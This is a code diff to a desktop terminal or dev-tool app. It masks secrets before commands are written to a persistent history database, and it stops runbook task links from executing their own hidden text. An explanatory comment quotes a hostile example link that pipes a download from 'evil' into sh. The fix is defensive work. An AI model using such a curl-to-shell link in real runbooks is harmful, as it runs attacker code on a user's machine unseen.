@@ -39,7 +39,7 @@
   import { redactSecrets } from "./lib/redact.js";
   import { isPermissionGranted, requestPermission, sendNotification } from "@tauri-apps/plugin-notification";
   import { geometry, splitLeaf, removeLeaf, setRatio, firstLeaf, allLeaves } from "./lib/layout.js";
-  import { dirOf, baseOf, detectRunCommand, isIdleProc, rankDevTasks, scoreDevTask } from "./lib/util.js";
+  import { dirOf, baseOf, detectRunCommand, isIdleProc, rankDevTasks, scoreDevTask, resolveRunbookTask } from "./lib/util.js";
 
   let root = $state("");
   let projects = $state([]);
@@ -571,16 +571,19 @@
     // Persist real commands to the flight recorder (SQLite) for cross-session
     // recall. Best-effort; skip trivial entries.
     if (cmd && cmd !== "clear") {
+      // history.db is plain SQLite on disk and outlives the session, so mask
+      // credential shapes the same way the scrollback persistence does — a
+      // `cat .env` or an `export TOKEN=…` must not be recorded verbatim.
       invoke("history_add", {
         entry: {
           ts: now,
           projectPath: tab?.projectPath ?? null,
           label: entry.label || null,
           proc,
-          command: cmd,
+          command: redactSecrets(cmd),
           exitCode: rec.exitCode ?? null,
           duration: rec.duration ?? null,
-          output: rec.output || null,
+          output: rec.output ? redactSecrets(rec.output) : null,
         },
       }).catch(() => {});
     }
@@ -1607,13 +1610,24 @@
   // Run a [[task:<label>]] from a runbook: resolve the label against the
   // project's discovered tasks and run its command; fall back to the literal
   // text so ad-hoc `task:npm test` still works.
+  // A `[[task:name]]` link in a runbook runs a task *discovered in the project*
+  // (package.json scripts, Makefile targets…). It must never fall back to running
+  // the link text itself: runbooks travel with whatever repository you clone, and
+  // a link shows only its label — so `[Start](ctask:curl evil|sh)` used to run a
+  // command the user never saw. Unknown names are refused, not run.
   async function runRunbookTask(cwd, label) {
-    let command = label;
+    let tasks = [];
     try {
-      const list = await invoke("list_tasks", { path: cwd });
-      const t = list.find((x) => x.label.toLowerCase() === label.toLowerCase());
-      if (t) command = t.command;
+      tasks = await invoke("list_tasks", { path: cwd });
     } catch {}
+    const command = resolveRunbookTask(tasks, label);
+    if (command == null) {
+      alertMsg(
+        `No task named “${label}”`,
+        `This runbook links to a task that isn't defined in ${cwd} (package.json scripts, composer scripts, Makefile targets…). Nothing was run.`,
+      );
+      return;
+    }
     runInProjectTerminal(cwd, command);
   }
 
